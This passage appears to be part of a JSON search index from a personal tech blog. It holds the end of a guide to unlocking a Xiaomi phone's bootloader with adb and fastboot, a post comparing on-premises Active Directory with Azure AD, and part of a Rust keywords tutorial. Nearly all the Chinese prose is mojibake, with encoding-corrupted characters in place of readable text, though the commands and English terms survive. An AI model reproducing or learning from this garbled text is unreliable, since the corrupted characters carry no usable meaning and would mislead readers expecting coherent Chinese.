åœ¨platformæ–‡ä»¶å¤¹ä¸‹æ‰“å¼€æ§åˆ¶å°è¾“å…¥ # æŸ¥çœ‹è®¾å¤‡ $ ./adb.exe devices List of devices attached 2b24874b device # è¿›å…¥fastbootæ¨¡å¼ $./adb.exe reboot bootloader # ç­‰å¾…æ‰‹æœºè¿›å…¥fastbootå æŸ¥çœ‹fastbootä¿¡æ¯ $ ./fastboot.exe devices 2b24874b fastboot # æ‰‹æœºé‡å¯ $ ./fastboot.exe reboot Rebooting OKAY [ 0.001s] Finished. Total time: 0.002s ä½¿ç”¨miflash unlock è§£BLé” æ­¤æ—¶ç™»å½•è´¦æˆ·å, å¯æ­£å¸¸è§£é”","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Win","slug":"æŠ€æœ¯å‘/Win","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Win/"}],"tags":[{"name":"fastboot","slug":"fastboot","permalink":"https://www.sizaif.com/tags/fastboot/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://www.sizaif.com/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"miflash unlock","slug":"miflash-unlock","permalink":"https://www.sizaif.com/tags/miflash-unlock/"}],"author":"sizaif"},{"title":"ADä¸AADåŒºåˆ«å’Œè”ç³»","slug":"ADä¸AADåŒºåˆ«å’Œè”ç³»","date":"2022-02-23T09:43:25.000Z","updated":"2022-04-10T09:00:03.009Z","comments":true,"path":"posts/2036bda7/","link":"","permalink":"https://www.sizaif.com/posts/2036bda7/","excerpt":"","text":"AD ä¸AAD çš„åŒºåˆ«ä¸è”ç³» 2022-01-07 [TOC] ADæ˜¯ä»€ä¹ˆ Active Directory(AD) æ´»åŠ¨ç›®å½• Active Directory (AD)æ˜¯ä¸€ä¸ªæ•°æ®åº“å’Œä¸€ç»„æœåŠ¡ï¼Œå°†ç”¨æˆ·ä¸ä»–ä»¬å®Œæˆå·¥ä½œæ‰€éœ€çš„ç½‘ç»œèµ„æºè¿æ¥èµ·æ¥ã€‚ æ´»åŠ¨ç›®å½•(Active Directory)ä¸»è¦æä¾›ä»¥ä¸‹åŠŸèƒ½ï¼š1ã€æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºç®¡ç†ï¼Œ2ã€ç”¨æˆ·æœåŠ¡ï¼Œ3ã€èµ„æºç®¡ç†ï¼Œ4ã€æ¡Œé¢é…ç½®ï¼Œ5ã€åº”ç”¨ç³»ç»Ÿæ”¯æ’‘ç­‰ã€‚ ADï¼ˆActive Directoryï¼‰æ¦‚è¿°ï¼š ä¼ ç»ŸADä¾èµ–äºKerboseè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒKerboseåˆå«åšä¸‰å¤´ç‹—ï¼Œè¦æ±‚è®¡ç®—æœºã€ç”¨æˆ·å’ŒåŸŸæ§ä¸‰æ–¹éƒ½è¦å‚ä¸éªŒè¯ã€‚å› æ­¤ï¼Œåœ¨ä¼ ç»ŸADä¸­ï¼Œè®¡ç®—æœºä¹Ÿæ‹¥æœ‰è´¦å·ï¼Œä¹Ÿéœ€è¦åŠ åŸŸã€‚å¦å¤–ï¼Œè®¡ç®—æœºä¹Ÿæœ‰ç™»å½•åˆ°åŸŸçš„è¿‡ç¨‹ï¼Œç”šè‡³å¯ä»¥æˆæƒè®¡ç®—æœºè´¦å·è®¿é—®æ–‡ä»¶å¤¹å’Œå…¶ä»–èµ„æºã€‚åœ¨ä¼ ç»ŸADä¸­ï¼Œæ‰€æœ‰ä»¥Local Systemã€Network Serviceèº«ä»½è¿è¡Œçš„æœåŠ¡åœ¨è®¿é—®åŸŸä¸­å…¶ä»–å…±äº«èµ„æºæ—¶ï¼Œéƒ½æ˜¯ä»¥è®¡ç®—æœºè´¦æˆ·çš„èº«ä»½è¿›è¡ŒéªŒè¯çš„ã€‚ ä¼ ç»ŸADçš„ç™»å½•ä¼šç”±ç”¨æˆ·å‘åŸŸæ§ç”³è¯·å’Œè®¡ç®—æœºä¹‹é—´é€šä¿¡çš„ä¼šè¯ç¥¨æ®(é»˜è®¤å­˜æ´»8å°æ—¶)ï¼Œç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶ï¼Œå‘è®¡ç®—æœºå‡ºç¤ºä¼šè¯ç¥¨æ®ï¼ŒåŒæ—¶åŠ ä¸Šæ—¶é—´æˆ³è¯æ˜æ²¡æœ‰ç¯¡æ”¹è¿‡ï¼Œè®¡ç®—æœºæ‰ä¼šæˆæƒç”¨æˆ·ç™»å½•ã€‚ç™»å½•ä»¥åï¼Œä¼šåœ¨è¯¥è®¡ç®—æœºä¸Šç”Ÿæˆç™»å½•ä¼šè¯ï¼Œå¹¶æŸ¥è¯¢è¯¥ç”¨æˆ·æ‰€å±çš„åŸŸç»„å’Œæœ¬åœ°ç»„ï¼Œä»¥æ­¤æ¥åˆ›å»ºè®¿é—®ä»¤ç‰Œï¼Œå¦‚æœæ˜¯æœ¬åœ°ç®¡ç†å‘˜ï¼Œåˆ™ä¼šç”Ÿæˆ2å¼ è®¿é—®ä»¤ç‰Œ(æ™®é€šç”¨æˆ·ä»¤ç‰Œå’Œç®¡ç†å‘˜ä»¤ç‰Œ)ã€‚ ä¼ ç»ŸADåè®®(å¦‚Kerboseå’ŒLDAPï¼‰å¤ªæ²‰é‡ï¼Œä¸€èˆ¬åªèƒ½é€‚åˆå†…ç½‘C/Sæ¶æ„ï¼Œæ— æ³•ç©¿é€Internetã€‚å¦‚æœè¦ç©¿é€Internetï¼Œé€šå¸¸è¦å°†å…¶è½¬ä¸ºåŸºäºClaimçš„å½¢å¼ï¼Œä¾‹å¦‚ADFSã€‚ADFSç±»ä¼¼äºè°ƒåˆ¶è§£è°ƒå™¨ï¼Œèƒ½å¤ŸæŠŠKerboseåè®®&quot;è½¬æ¢&quot;ä¸ºå…¶ä»–InternetéªŒè¯åè®®(SAMLç­‰)ï¼Œä½†è¿™å…¶å®å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„&quot;è½¬æ¢&quot;ã€‚ ADDS æ˜¯ä»€ä¹ˆ What is Active Directory? Active Directory Domain Services (AD DS) åŸŸæ§æœåŠ¡ è¿è¡ŒAD DSçš„æœåŠ¡å™¨ç§°ä¸ºåŸŸæ§åˆ¶å™¨(DCs, domain controllers) ç»„ç»‡é€šå¸¸å…·æœ‰å¤šä¸ªDCSï¼Œæ¯ä¸ªç»„ç»‡éƒ½æœ‰ä¸€ä¸ªç”¨äºæ•´ä¸ªåŸŸçš„ç›®å½•çš„å‰¯æœ¬ã€‚å¯¹ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ä¸Šçš„ç›®å½• - ä¾‹å¦‚å¯†ç æ›´æ–°æˆ–åˆ é™¤ç”¨æˆ·å¸æˆ·çš„æ›´æ”¹å°†å¤åˆ¶åˆ°å…¶ä»–DCSï¼Œä»¥ä¾¿å®ƒä»¬ä¿æŒæœ€æ–°çŠ¶æ€ã€‚å…¨å±€ç›®å½•æœåŠ¡å™¨æ˜¯ä¸€ä¸ªDCï¼Œå®ƒå­˜å‚¨å…¶åŸŸç›®å½•ä¸­çš„æ‰€æœ‰å¯¹è±¡çš„å®Œæ•´å‰¯æœ¬ä»¥åŠæ£®æ—ä¸­æ‰€æœ‰å…¶ä»–åŸŸçš„æ‰€æœ‰å¯¹è±¡çš„éƒ¨åˆ†å‰¯æœ¬;è¿™ä½¿ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºèƒ½å¤Ÿåœ¨å…¶æ—çš„ä»»ä½•åŸŸä¸­æŸ¥æ‰¾å¯¹è±¡ã€‚æ¡Œé¢ï¼Œç¬”è®°æœ¬ç”µè„‘å’Œè¿è¡ŒWindowsï¼ˆè€Œä¸æ˜¯Windows Serverï¼‰çš„å…¶ä»–è®¾å¤‡å¯ä»¥æ˜¯Active Directoryç¯å¢ƒçš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒä»¬ä¸ä¼šè¿è¡ŒAD DSã€‚AD DSä¾èµ–äºå¤šç§å»ºç«‹çš„åè®®å’Œæ ‡å‡†ï¼ŒåŒ…æ‹¬LDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰ï¼ŒKerberoså’ŒDNSï¼ˆåŸŸåç³»ç»Ÿï¼‰ã€‚ AADæ˜¯ä»€ä¹ˆ Azure Active Directory (Azure AD) æ˜¯ Microsoft åŸºäºäº‘çš„èº«ä»½å’Œè®¿é—®ç®¡ç†æœåŠ¡ï¼Œå¯å®ç°çš„å‘˜å·¥ç™»å½•å’Œè®¿é—® Azure ä¸­çš„èµ„æºï¼š What is Azure Active Directory AADï¼ˆAzure Active Directoryï¼‰æ¦‚è¿° Azure æä¾›é€šè¿‡AADç®¡ç†èº«ä»½éªŒè¯å’Œæˆæƒçš„æœåŠ¡ï¼ŒAADæ˜¯ä¸€ç§åŸºäºäº‘çš„æ ‡è¯†æœåŠ¡ï¼Œç®¡ç†å‘˜å’Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨Azure ADé…ç½®çš„é›†ä¸­å¼è§„åˆ™å’Œç­–ç•¥æ¥æ§åˆ¶å¯¹å†…éƒ¨å’Œå¤–éƒ¨æ•°æ®åŠåº”ç”¨ç¨‹åºçš„è®¿é—®ã€‚ AADæ”¯æŒå¸¸è§çš„InternetéªŒè¯åè®®ï¼Œä¾‹å¦‚WS-Federationã€SAMLç­‰è½»é‡çº§çš„åŸºäºClaimçš„éªŒè¯åè®®ã€‚ä¸ä¼ ç»ŸADç±»ä¼¼ï¼ŒAADåŒæ ·æœ‰è®¿é—®ä»¤ç‰Œï¼Œä¸è¿‡å…¶ä¸­çš„å†…å®¹æ˜¯Claimå±æ€§ï¼Œè€Œä¸”ç”±äºéœ€è¦åœ¨Internetä¸Šäº¤ä»˜ï¼Œæ‰€ä»¥éœ€è¦å¯¹å…¶è¿›è¡Œæ•°å­—ç­¾åå’ŒåŠ å¯†ã€‚ä¸‹é¢æ˜¯AADä¸»è¦åŒ…å«çš„å››ä¸ªæœåŠ¡ï¼š èº«ä»½éªŒè¯ï¼š åŒ…æ‹¬éªŒè¯èº«ä»½ä»¥è®¿é—®åº”ç”¨ç¨‹åºå’Œèµ„æºã€è‡ªåŠ©å¯†ç é‡ç½®ã€å¤šé‡èº«ä»½éªŒè¯ï¼ˆMFAï¼‰ç­‰åŠŸèƒ½ã€‚ å•ä¸€ç™»å½•ï¼ˆSSOï¼‰ï¼šç”¨æˆ·åªéœ€è®°ä½ä¸€ä¸ªIDå’Œä¸€ä¸ªå¯†ç å³å¯è®¿é—®å¤šä¸ªåº”ç”¨ç¨‹åºã€‚ åº”ç”¨ç¨‹åºç®¡ç†ï¼šå¯ä»¥ä½¿ç”¨AADåº”ç”¨ç¨‹åºä»£ç†ã€SSOã€â€œè®¿é—®â€é¢æ¿å’ŒSaaSåº”ç”¨æ¥ç®¡ç†äº‘åº”ç”¨å’Œæœ¬åœ°åº”ç”¨ã€‚ è®¾å¤‡ç®¡ç†ï¼šç®¡ç†äº‘è®¾å¤‡æˆ–æœ¬åœ°è®¾å¤‡è®¿é—®ä¼ä¸šæ•°æ®çš„æ–¹å¼ AADDSæ˜¯ä»€ä¹ˆ Azure Active Directory Domain Services( Azure AD DS) æä¾›æ‰˜ç®¡åŸŸæœåŠ¡ ç±»ä¼¼ADDSï¼Œä¾‹å¦‚åŸŸåŠ å…¥ã€ç»„ç­–ç•¥ã€è½»å‹ç›®å½•è®¿é—®åè®® (LDAP) å’Œ Kerberos/NTLM èº«ä»½éªŒè¯ã€‚ æ— éœ€åœ¨äº‘ä¸­éƒ¨ç½²ã€ç®¡ç†å’Œä¿®è¡¥åŸŸæ§åˆ¶å™¨ (DC) å³å¯ä½¿ç”¨è¿™äº›åŸŸæœåŠ¡ã€‚ Azure AD DS æ‰˜ç®¡åŸŸä½¿ä½ èƒ½å¤Ÿåœ¨äº‘ä¸­æˆ–ä½ ä¸å¸Œæœ›ç›®å½•æŸ¥æ‰¾å§‹ç»ˆè¿”å›åˆ°æœ¬åœ° AD DS ç¯å¢ƒçš„ä½ç½®ï¼Œè¿è¡Œæ— æ³•ä½¿ç”¨ç°ä»£èº«ä»½éªŒè¯æ–¹æ³•çš„æ—§ç‰ˆåº”ç”¨ç¨‹åºã€‚ ä½ å¯ä»¥å°†è¿™äº›æ—§ç‰ˆåº”ç”¨ç¨‹åºä»æœ¬åœ°ç¯å¢ƒç›´æ¥è¿ç§»åˆ°æ‰˜ç®¡åŸŸï¼Œè€Œæ— éœ€åœ¨äº‘ä¸­ç®¡ç† AD DS ç¯å¢ƒã€‚ Azure AD DS ä¸ç°æœ‰çš„ Azure AD ç§Ÿæˆ·é›†æˆã€‚ é€šè¿‡æ­¤é›†æˆï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å…¶ç°æœ‰å‡­æ®ç™»å½•åˆ°ä¸æ‰˜ç®¡åŸŸç›¸è¿çš„æœåŠ¡å’Œåº”ç”¨ç¨‹åºã€‚ è¿˜å¯ä»¥ä½¿ç”¨ç°æœ‰ç»„å’Œç”¨æˆ·å¸æˆ·æ¥ä¿æŠ¤å¯¹èµ„æºçš„è®¿é—®ã€‚ è¿™äº›åŠŸèƒ½å¯æ›´é¡ºç•…åœ°å°†æœ¬åœ°èµ„æºç›´æ¥è¿ç§»åˆ° Azureã€‚ ä»€ä¹ˆæ˜¯ Azure Active Directory åŸŸæœåŠ¡ ADä¸AADçš„åŒºåˆ«ä¸è”ç³» å°† Active Directory ä¸ Azure Active Directory è¿›è¡Œæ¯”è¾ƒ ADå’ŒAADçš„åŒºåˆ« AADä¸ä¼ ç»ŸADæ˜¯å®Œå…¨ä¸åŒçš„ï¼Œå‰è€…æ˜¯äº‘æœåŠ¡ï¼Œåªç®¡éªŒè¯ä¸æˆæƒ, è€ŒAADæ›´åƒæ˜¯ä¼ ç»ŸADå‘äº‘ç«¯çš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨ä»¥æ»¡è¶³æ›´å¤šçš„åº”ç”¨åœºæ™¯ä¸éªŒè¯éœ€æ±‚ã€‚AAD é€šè¿‡ä¸ºç»„ç»‡æä¾›ä¸€ç§é€‚ç”¨äºåœ¨äº‘ä¸­å’Œæœ¬åœ°æ‰€æœ‰åº”ç”¨çš„æ ‡è¯†å³æœåŠ¡è§£å†³æ–¹æ¡ˆï¼Œå°†ç›®å½•æœåŠ¡æ–¹æ¡ˆæå‡åˆ°äº†ä¸€ä¸ªæ–°å±‚æ¬¡ã€‚åŒæ—¶ï¼ŒAADæ˜¯åŸºäºäº‘çš„èº«ä»½å’Œè®¿é—®ç®¡ç†è§£å†³æ–¹æ¡ˆï¼Œå®ƒä¹Ÿå¯ä»¥ä¸æœ¬åœ°ADåŒæ­¥ï¼Œä¸ºæœ¬åœ°å’ŒåŸºäºäº‘çš„ç³»ç»Ÿæä¾›èº«ä»½éªŒè¯ã€‚AADç›¸è¾ƒäºADçš„æ‰©å±•åŠŸèƒ½æ¦‚è¿°å¦‚ä¸‹ï¼š AAD è§£å†³äº†ä¼ ç»ŸADæ— æ³•æ‰©å±•åˆ°å¤–éƒ¨çš„å±€é™æ€§é—®é¢˜ã€‚ä¼ ç»ŸADåœ¨éªŒè¯å’Œæˆæƒæ–¹é¢æ›´å¤šçš„æ˜¯åšéªŒè¯ï¼Œå¹¶ä¸”æ— æ³•æ‰©å±•åˆ°å¤–éƒ¨ï¼ˆå—é™äºKerboseå’ŒLDAPï¼‰ï¼Œåªèƒ½å±€é™åœ¨ä¼ä¸šç¯å¢ƒã€‚è€ŒAADæ°å¥½èƒ½å¤Ÿè§£å†³è¿™ä¸€é—®é¢˜ï¼Œå®ƒæ”¯æŒå¦‚OAuth2ã€SAMLã€WS-Federationå’ŒOpenIDç­‰è½»é‡çº§çš„åŸºäºClaimçš„éªŒè¯åè®®ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†Restæ¥å£ã€‚ AAD æ›´å…³æ³¨äºéªŒè¯ä¸æˆæƒã€‚é™¤å»éªŒè¯ï¼Œä¼ ç»ŸADæ›´å…³æ³¨äºèµ„æºçš„å‘ç°ä¸ç®¡ç†ï¼Œå¦‚æœ€å¸¸ç”¨çš„ç»„ç­–ç•¥ï¼Œè€Œè¿™éƒ¨åˆ†å†…å®¹åœ¨AADé‡Œæ˜¯ä¸å…³æ³¨çš„ï¼ŒAADå…³æ³¨çš„æ˜¯éªŒè¯ä¸æˆæƒï¼Œè€Œéç®¡ç†æœ¬èº«ã€‚ AAD é€šè¿‡å¤šé‡èº«ä»½éªŒè¯å’Œæ— å¯†ç æŠ€æœ¯æé«˜äº†å¯†ç å®‰å…¨æ€§ã€‚ä¼ ç»ŸADä¸­çš„å‡­æ®åŸºäºå¯†ç ã€è¯ä¹¦æˆ–æ™ºèƒ½å¡çš„èº«ä»½éªŒè¯ï¼Œé€šè¿‡å¯†ç ç­–ç•¥æ¥ç®¡ç†å¯†ç çš„é•¿åº¦ã€åˆ°æœŸæ—¶é—´å’Œå¤æ‚æ€§ï¼Œä»¥æ­¤ç¡®ä¿ADä¸­å¯†ç çš„å®‰å…¨æ€§ï¼›è€ŒAADå¯¹äº‘å’Œæœ¬åœ°ä½¿ç”¨æ™ºèƒ½å¯†ç ä¿æŠ¤ï¼ŒAADé€šè¿‡å¤šé‡èº«ä»½éªŒè¯å’Œæ— å¯†ç æŠ€æœ¯æ˜¾è‘—çš„æé«˜äº†å¯†ç å®‰å…¨æ€§ï¼ŒåŒæ—¶ä¹Ÿä¸ºç”¨æˆ·æä¾›äº†è‡ªåŠ©é‡ç½®å¯†ç çš„åŠŸèƒ½æ¥æå‡ç”¨æˆ·ä½“éªŒï¼Œé™ä½æŠ€æœ¯æ”¯æŒæˆæœ¬ã€‚ AAD ä½¿ç”¨AADåº”ç”¨ç¨‹åºä»£ç†è®¿é—®æœ¬åœ°åº”ç”¨ã€‚ADå½“ä¸­å¤§å¤šæ•°æœ¬åœ°åº”ç”¨éƒ½ä½¿ç”¨LDAPã€NTLMæˆ–kerberosåè®®æ¥æ§åˆ¶ç”¨æˆ·çš„è®¿é—®ã€‚AADåˆ™å¯ä½¿ç”¨åœ¨æœ¬åœ°è¿è¡Œçš„AADåº”ç”¨ç¨‹åºä»£ç†æ¥è®¿é—®è¿™äº›ç±»å‹çš„æœ¬åœ°åº”ç”¨ã€‚ AAD å®Œå…¨åŸºäºäº‘ã€‚AAD çš„ä¼˜åŠ¿åœ¨äºå®ƒå®Œå…¨åŸºäºäº‘æ‰€æä¾›çš„çµæ´»æ€§ï¼Œè¿™æ„å‘³ç€å®ƒæ—¢å¯ä»¥å……å½“ç»„ç»‡çš„å”¯ä¸€ç›®å½•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ AAD Connect ä¸æœ¬åœ°ADç›®å½•æœåŠ¡åŒæ­¥ã€‚æ— è®ºé‡‡å–å“ªç§æ–¹å¼ï¼Œå®ƒéƒ½ä½¿æœ¬åœ°å’ŒåŸºäºäº‘çš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®ç›¸åŒçš„åº”ç”¨ç¨‹åºå’Œèµ„æºï¼ŒåŒæ—¶å—ç›Šäºè¯¸å¦‚å•ç‚¹ç™»å½• (SSO)ã€å¤šé‡èº«ä»½éªŒè¯ (MFA)ã€æ¡ä»¶è®¿é—®ç­‰åŠŸèƒ½ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªå•ä¸€ä½ç½®æ¥ç®¡ç†æ•´ä¸ª IT èµ„äº§ä¸­çš„èº«ä»½ã€å®‰å…¨æ€§å’Œåˆè§„æ€§æ§åˆ¶ã€‚ ä¸‹è¡¨å±•ç¤ºäº†ADä¸AADçš„å…·ä½“åŒºåˆ«ï¼š On-Premises Active Directory Azure Active Directory Authentication kerberos A number of protocols such as SAMLï¼ŒWS-Federation and OAuthï¼ŒOIDC Locator mechanism DNS âœ— Structure Hierarchical(based on X.500) Flat Query LDAP A rest API, called AD Graph API Communication types All kinds of types HTTP(port 80) HTTP(port 443) Devices Corporate assets, mostly PC BYOD Focus on On-perm services Internet-based services, such as O365, Azure and Facebook(Any services federated with Azure AD) Domain joined âœ“ âœ— User âœ“ âœ“ Group âœ“ âœ“ OU âœ“ âœ— GPO âœ“ âœ—","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Azure","slug":"æŠ€æœ¯å‘/Azure","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Azure/"}],"tags":[{"name":"Azure","slug":"Azure","permalink":"https://www.sizaif.com/tags/Azure/"},{"name":"å¾®è½¯","slug":"å¾®è½¯","permalink":"https://www.sizaif.com/tags/%E5%BE%AE%E8%BD%AF/"}],"author":"sizaif"},{"title":"Rustå­¦ä¹ 4-å…³é”®å­—","slug":"rustå­¦ä¹ 4-å…³é”®å­—","date":"2022-02-21T14:08:41.000Z","updated":"2022-02-21T15:18:03.000Z","comments":true,"path":"posts/8358a15/","link":"","permalink":"https://www.sizaif.com/posts/8358a15/","excerpt":"","text":"å…³é”®å­— ä¸‹é¢çš„åˆ—è¡¨åŒ…å« Rust ä¸­æ­£åœ¨ä½¿ç”¨æˆ–è€…ä»¥åä¼šç”¨åˆ°çš„å…³é”®å­—ã€‚å› æ­¤ï¼Œè¿™äº›å…³é”®å­—ä¸èƒ½è¢«ç”¨ä½œæ ‡è¯†ç¬¦ï¼ˆé™¤äº† â€œåŸå§‹æ ‡è¯†ç¬¦â€ éƒ¨åˆ†ä»‹ç»çš„åŸå§‹æ ‡è¯†ç¬¦ï¼‰ï¼Œè¿™åŒ…æ‹¬å‡½æ•°ã€å˜é‡ã€å‚æ•°ã€ç»“æ„ä½“å­—æ®µã€æ¨¡å—ã€crateã€å¸¸é‡ã€å®ã€é™æ€å€¼ã€å±æ€§ã€ç±»å‹ã€trait æˆ–ç”Ÿå‘½å‘¨æœŸ çš„åå­—ã€‚ ç›®å‰æ­£åœ¨ä½¿ç”¨çš„å…³é”®å­— å¦‚ä¸‹å…³é”®å­—ç›®å‰æœ‰å¯¹åº”å…¶æè¿°çš„åŠŸèƒ½ã€‚ as - å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæ¶ˆé™¤ç‰¹å®šåŒ…å«é¡¹çš„ trait çš„æ­§ä¹‰ï¼Œæˆ–è€…å¯¹ use å’Œ extern crate è¯­å¥ä¸­çš„é¡¹é‡å‘½å async - è¿”å›ä¸€ä¸ª Future è€Œä¸æ˜¯é˜»å¡å½“å‰çº¿ç¨‹ await - æš‚åœæ‰§è¡Œç›´åˆ° Future çš„ç»“æœå°±ç»ª break - ç«‹åˆ»é€€å‡ºå¾ªç¯ const - å®šä¹‰å¸¸é‡æˆ–ä¸å˜è£¸æŒ‡é’ˆï¼ˆconstant raw pointerï¼‰ continue - ç»§ç»­è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯è¿­ä»£ crate - é“¾æ¥ï¼ˆlinkï¼‰ä¸€ä¸ªå¤–éƒ¨ crate æˆ–ä¸€ä¸ªä»£è¡¨å®å®šä¹‰çš„ crate çš„å®å˜é‡ dyn - åŠ¨æ€åˆ†å‘ trait å¯¹è±¡ else - ä½œä¸º if å’Œ if let æ§åˆ¶æµç»“æ„çš„ fallback enum - å®šä¹‰ä¸€ä¸ªæšä¸¾ extern - é“¾æ¥ä¸€ä¸ªå¤–éƒ¨ crate ã€å‡½æ•°æˆ–å˜é‡ false - å¸ƒå°”å­—é¢å€¼ false fn - å®šä¹‰ä¸€ä¸ªå‡½æ•°æˆ– å‡½æ•°æŒ‡é’ˆç±»å‹ (function pointer type) for - éå†ä¸€ä¸ªè¿­ä»£å™¨æˆ–å®ç°ä¸€ä¸ª trait æˆ–è€…æŒ‡å®šä¸€ä¸ªæ›´é«˜çº§çš„ç”Ÿå‘½å‘¨æœŸ if - åŸºäºæ¡ä»¶è¡¨è¾¾å¼çš„ç»“æœåˆ†æ”¯ impl - å®ç°è‡ªæœ‰æˆ– trait åŠŸèƒ½ in - for å¾ªç¯è¯­æ³•çš„ä¸€éƒ¨åˆ† let - ç»‘å®šä¸€ä¸ªå˜é‡ loop - æ— æ¡ä»¶å¾ªç¯ match - æ¨¡å¼åŒ¹é… mod - å®šä¹‰ä¸€ä¸ªæ¨¡å— move - ä½¿é—­åŒ…è·å–å…¶æ‰€æ•è·é¡¹çš„æ‰€æœ‰æƒ mut - è¡¨ç¤ºå¼•ç”¨ã€è£¸æŒ‡é’ˆæˆ–æ¨¡å¼ç»‘å®šçš„å¯å˜æ€§ pub - è¡¨ç¤ºç»“æ„ä½“å­—æ®µã€impl å—æˆ–æ¨¡å—çš„å…¬æœ‰å¯è§æ€§ ref - é€šè¿‡å¼•ç”¨ç»‘å®š return - ä»å‡½æ•°ä¸­è¿”å› Self - å®šä¹‰æˆ–å®ç° trait çš„ç±»å‹çš„ç±»å‹åˆ«å self - è¡¨ç¤ºæ–¹æ³•æœ¬èº«æˆ–å½“å‰æ¨¡å— static - è¡¨ç¤ºå…¨å±€å˜é‡æˆ–åœ¨æ•´ä¸ªç¨‹åºæ‰§è¡ŒæœŸé—´ä¿æŒå…¶ç”Ÿå‘½å‘¨æœŸ struct - å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ super - è¡¨ç¤ºå½“å‰æ¨¡å—çš„çˆ¶æ¨¡å— trait - å®šä¹‰ä¸€ä¸ª trait true - å¸ƒå°”å­—é¢å€¼ true type - å®šä¹‰ä¸€ä¸ªç±»å‹åˆ«åæˆ–å…³è”ç±»å‹ union - å®šä¹‰ä¸€ä¸ª union å¹¶ä¸”æ˜¯ union å£°æ˜ä¸­å”¯ä¸€ç”¨åˆ°çš„å…³é”®å­— unsafe - è¡¨ç¤ºä¸å®‰å…¨çš„ä»£ç ã€å‡½æ•°ã€trait æˆ–å®ç° use - å¼•å…¥å¤–éƒ¨ç©ºé—´çš„ç¬¦å· where - è¡¨ç¤ºä¸€ä¸ªçº¦æŸç±»å‹çš„ä»å¥ while - åŸºäºä¸€ä¸ªè¡¨è¾¾å¼çš„ç»“æœåˆ¤æ–­æ˜¯å¦è¿›è¡Œå¾ªç¯ ä¿ç•™åšå°†æ¥ä½¿ç”¨çš„å…³é”®å­— å¦‚ä¸‹å…³é”®å­—æ²¡æœ‰ä»»ä½•åŠŸèƒ½ï¼Œä¸è¿‡ç”± Rust ä¿ç•™ä»¥å¤‡å°†æ¥çš„åº”ç”¨ã€‚ abstract become box do final macro override priv try typeof unsized virtual yield åŸå§‹æ ‡è¯†ç¬¦ åŸå§‹æ ‡è¯†ç¬¦ï¼ˆRaw identifiersï¼‰å…è®¸ä½ ä½¿ç”¨é€šå¸¸ä¸èƒ½ä½¿ç”¨çš„å…³é”®å­—ï¼Œå…¶å¸¦æœ‰ r# å‰ç¼€ã€‚ ä¾‹å¦‚ï¼Œmatch æ˜¯å…³é”®å­—ã€‚å¦‚æœå°è¯•ç¼–è¯‘å¦‚ä¸‹ä½¿ç”¨ match ä½œä¸ºåå­—çš„å‡½æ•°ï¼š fn match(needle: &amp;str, haystack: &amp;str) -> bool &#123; haystack.contains(needle) &#125; ä¼šå¾—åˆ°è¿™ä¸ªé”™è¯¯ï¼š error: expected identifier, found keyword `match` --> src/main.rs:4:4 | 4 | fn match(needle: &amp;str, haystack: &amp;str) -> bool &#123; | ^^^^^ expected identifier, found keyword è¯¥é”™è¯¯è¡¨ç¤ºä½ ä¸èƒ½å°†å…³é”®å­— match ç”¨ä½œå‡½æ•°æ ‡è¯†ç¬¦ã€‚ä½ å¯ä»¥ä½¿ç”¨åŸå§‹æ ‡è¯†ç¬¦å°† match ä½œä¸ºå‡½æ•°åç§°ä½¿ç”¨ï¼š æ–‡ä»¶å: src/main.rs fn r#match(needle: &amp;str, haystack: &amp;str) -> bool &#123; haystack.contains(needle) &#125; fn main() &#123; assert!(r#match(\"foo\", \"foobar\")); &#125; æ­¤ä»£ç ç¼–è¯‘æ²¡æœ‰ä»»ä½•é”™è¯¯ã€‚æ³¨æ„ r# å‰ç¼€éœ€åŒæ—¶ç”¨äºå‡½æ•°åå®šä¹‰å’Œ main å‡½æ•°ä¸­çš„è°ƒç”¨ã€‚ åŸå§‹æ ‡è¯†ç¬¦å…è®¸ä½¿ç”¨ä½ é€‰æ‹©çš„ä»»ä½•å•è¯ä½œä¸ºæ ‡è¯†ç¬¦ï¼Œå³ä½¿è¯¥å•è¯æ°å¥½æ˜¯ä¿ç•™å…³é”®å­—ã€‚ æ­¤å¤–ï¼ŒåŸå§‹æ ‡è¯†ç¬¦å…è®¸ä½ ä½¿ç”¨ä»¥ä¸åŒäºä½ çš„ crate ä½¿ç”¨çš„ Rust ç‰ˆæœ¬ç¼–å†™çš„åº“ã€‚æ¯”å¦‚ï¼Œtry åœ¨ 2015 edition ä¸­ä¸æ˜¯å…³é”®å­—ï¼Œè€Œåœ¨ 2018 edition åˆ™æ˜¯ã€‚æ‰€ä»¥å¦‚æœç”¨ 2015 edition ç¼–å†™çš„åº“ä¸­å¸¦æœ‰ try å‡½æ•°ï¼Œåœ¨ 2018 edition ä¸­è°ƒç”¨æ—¶å°±éœ€è¦ä½¿ç”¨åŸå§‹æ ‡è¯†ç¬¦è¯­æ³•ï¼Œåœ¨è¿™é‡Œæ˜¯ 